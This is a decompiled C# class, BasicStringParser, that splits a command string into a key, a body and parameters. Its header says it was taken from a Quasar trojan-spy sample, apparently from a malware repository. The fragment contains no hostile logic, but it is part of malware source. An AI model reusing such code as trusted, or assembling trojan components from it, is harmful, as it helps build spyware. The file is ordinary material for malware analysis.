// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.SuperSocket.ProtoBase.BasicStringParser
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using System;

namespace NoiseMe.Drags.App.Models.SuperSocket.ProtoBase
{
  public class BasicStringParser : IStringParser
  {
    private const string SPACE = " ";
    private readonly string m_Spliter;
    private readonly string[] m_ParameterSpliters;
    public static readonly BasicStringParser DefaultInstance = new BasicStringParser();

    public BasicStringParser()
      : this(" ", " ")
    {
    }

    public BasicStringParser(string spliter, string parameterSpliter)
    {
      this.m_Spliter = spliter;
      this.m_ParameterSpliters = new string[1]
      {
        parameterSpliter
      };
    }

    public void Parse(string source, out string key, out string body, out string[] parameters)
    {
      int length = source.IndexOf(this.m_Spliter);
      if (length > 0)
      {
        key = source.Substring(0, length);
        body = source.Substring(length + 1);
        parameters = body.Split(this.m_ParameterSpliters, StringSplitOptions.RemoveEmptyEntries);
      }
      else
      {
        key = body = source;
        parameters = (string[]) null;
      }
    }
  }
}
